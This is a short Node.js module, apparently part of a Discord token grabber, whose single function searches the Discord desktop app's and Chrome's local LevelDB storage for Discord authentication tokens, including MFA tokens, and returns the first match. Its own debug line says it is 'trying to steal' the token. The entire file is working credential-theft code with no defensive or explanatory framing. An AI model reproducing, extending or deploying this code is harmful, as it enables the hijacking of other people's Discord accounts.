const fs = require('fs');
const path = require('path');

async function getDiscordToken() {
    console.log("[DEBUG] Trying to steal Discord token...");
    let token = null;

    // Native Discord app
    try {
        const appPath = path.join(process.env.APPDATA || 'C:\\Users\\Bigbamo\\AppData\\Roaming', 'discord', 'Local Storage', 'leveldb');
        console.log("[DEBUG] Native path:", appPath);
        if (fs.existsSync(appPath)) {
            const files = fs.readdirSync(appPath).filter(f => f.endsWith('.log') || f.endsWith('.ldb'));
            console.log("[DEBUG] Native files:", files.length);
            for (const file of files) {
                try {
                    const content = fs.readFileSync(path.join(appPath, file), 'utf8');
                    const match = content.match(/mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}/);
                    if (match) {
                        token = match[0];
                        console.log("[SUCCESS] Native token found!");
                        break;
                    }
                } catch {}
            }
        } else {
            console.log("[INFO] No native app folder");
        }
    } catch (e) {
        console.error("[ERROR] Native token error:", e.message);
    }

    // Chrome web
    if (!token) {
        console.log("[DEBUG] Checking Chrome storage...");
        try {
            const chromePath = path.join(process.env.LOCALAPPDATA || 'C:\\Users\\Bigbamo\\AppData\\Local', 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb');
            console.log("[DEBUG] Chrome path:", chromePath);
            if (fs.existsSync(chromePath)) {
                const files = fs.readdirSync(chromePath).filter(f => f.endsWith('.log') || f.endsWith('.ldb'));
                console.log("[DEBUG] Chrome files:", files.length);
                for (const file of files) {
                    try {
                        const content = fs.readFileSync(path.join(chromePath, file), 'utf8');
                        const match = content.match(/mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}/);
                        if (match) {
                            token = match[0];
                            console.log("[SUCCESS] Chrome token found!");
                            break;
                        }
                    } catch {}
                }
            } else {
                console.log("[INFO] No Chrome LevelDB");
            }
        } catch (e) {
            console.error("[ERROR] Chrome token error:", e.message);
        }
    }

    if (token) console.log("[SUCCESS] Token:", token.substring(0, 10) + "...");
    else console.log("[INFO] No token found");

    return token;
}

module.exports = { getDiscordToken };
